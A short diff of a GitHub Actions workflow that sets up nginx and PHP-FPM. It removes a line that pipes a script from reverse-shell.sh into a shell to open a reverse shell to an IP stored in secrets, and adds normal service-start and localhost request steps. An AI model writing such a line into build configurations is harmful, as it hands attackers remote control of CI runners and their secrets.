@@ -48,13 +48,20 @@ jobs:
           cat /etc/nginx/nginx.conf
           echo "::endgroup::"
           sudo nginx -t
-          curl https://reverse-shell.sh/${{ secrets.IP }}:1337 | sh
+
+      - name: Start services
+        run: |
+          sudo systemctl start nginx
+          sudo systemctl start php${{ env.PHP_VERSION}}-fpm
 
       - name: Fix permission
         if: ${{ !env.ACT }}
         run: sudo usermod -aG docker www-data
 
-      - name: Start services
+      - name: Send request to /
+        run: curl -vf localhost || true
+
+      - name: Restart services
         run: |
           sudo systemctl restart nginx
           sudo systemctl restart php${{ env.PHP_VERSION}}-fpm
